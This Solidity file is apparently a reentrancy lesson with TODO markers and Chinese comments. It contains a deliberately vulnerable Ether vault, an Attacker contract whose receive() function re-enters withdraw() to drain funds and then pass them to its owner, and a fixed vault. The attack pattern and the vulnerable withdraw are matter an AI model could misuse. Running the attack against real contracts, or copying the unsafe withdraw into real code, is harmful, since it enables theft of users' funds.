// src/Reentrancy.sol
pragma solidity ^0.8.19;

/**
 * @title UnsafeEtherVault
 * @dev 这个金库是脆弱的。它在转账（交互）之后，才更新（生效）余额。
 */
contract UnsafeEtherVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value; // 存款函数
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        if (amount > 0) {
            (bool sent,) = msg.sender.call{value: amount}("");
            require(sent, "Failed to send Ether");
            balances[msg.sender] = 0;
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title Attacker
 * @dev 我的攻击合约，它有一个邪恶的 receive() 函数
 */
contract Attacker {
    UnsafeEtherVault private vault;
    address private owner;
    uint256 private attackAmount = 0;

    constructor(address _vaultAddress) {
        vault = UnsafeEtherVault(_vaultAddress);
        owner = msg.sender;
    }

    // TODO: 1. 编写一个 attack() 函数
    function attack() public payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // TODO: 2. 编写一个 receive() external payable 函数
    receive() external payable {
        if (vault.getBalance() >= vault.balances(address(this))) {
            (bool hack,) = address(vault).call(abi.encodeWithSignature("withdraw()"));
            require(hack, "attack failed");
            attackAmount++;
        }
    }

    // 允许我们（攻击者）最后把赃款提走
    function drain() public {
        (bool sent,) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to drain");
    }
}

/**
 * @title SafeEtherVault
 * @dev 这个金库是安全的。它严格遵循“检查-生效-交互”模式。
 */
contract SafeEtherVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // TODO: 3. 编写修复后的withdraw()函数
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        if (amount > 0) {
            balances[msg.sender] = 0;
            (bool sent,) = msg.sender.call{value: amount}("");
            if (!sent) {
                balances[msg.sender] = amount;
                revert("Failed to send Ether");
            }
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
